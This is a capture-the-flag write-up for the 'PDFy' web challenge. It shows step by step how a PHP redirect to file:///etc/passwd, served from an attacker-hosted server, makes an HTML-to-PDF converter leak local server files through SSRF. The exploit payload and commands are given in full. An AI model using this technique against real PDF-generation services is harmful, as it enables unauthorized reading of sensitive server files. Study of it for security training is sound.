# PDFy writeup
> By Peter (thetaphase), jul 10, 2024

## CHALLENGE DESCRIPTION
Welcome to PDFy, the exciting challenge where you turn your favorite web pages into portable PDF documents! It's your chance to capture, share, and preserve the best of the internet with precision and creativity. Join us and transform the way we save and cherish web content! NOTE: Leak /etc/passwd to get the flag!

## Introduction
I'll walk you through the steps I took to exploit a vulnerability in PDFy to retrieve the `/etc/passwd` file from a server. This method leverages a PHP script to redirect to the target file and uses a temporary server hosted on DigitalOcean.

## Setting Up the Environment

### Hosting a Temporary Server
First, I used a server that I hosted on DigitalOcean. I highly recommend using a temporary server or a server that you use solely for pentesting, as you'll need to expose it to the Internet. 

### Configuring the Firewall
Ensure that port 8080 is allowed in your firewall settings. This is crucial for accessing the PHP server we'll set up.

## Crafting the PHP Payload

### Creating the PHP File
I created a PHP file named `payload.php` with the following content:

```php
<?php header('location:file:///etc/passwd'); ?>
```

This script redirects to the `/etc/passwd` file on the server when accessed.

### Starting the PHP Server
Next, I opened a PHP server on port 8080 with the following command:

```sh
php -S 0.0.0.0:8080
```

This command starts the PHP built-in server, listening on all available IP addresses.

## Exploiting PDFy

### Using the Payload in PDFy
To exploit PDFy, I used the following URL in its input field:

```
http://<YOUR_SERVER_IP>:8080/payload.php
```

Replace `<YOUR_SERVER_IP>` with the actual IP address of your server. In my case, it was `http://137.184.229.44:8080/payload.php`.

### Retrieving the Flag
Once the URL is processed by PDFy, the resulting PDF will contain the contents of the `/etc/passwd` file from the server. The last line of this file will contain our flag.

## Conclusion
By following these steps, you can successfully exploit PDFy to retrieve sensitive files from a server.

## References
https://exploit-notes.hdks.org/exploit/web/security-risk/wkhtmltopdf-ssrf/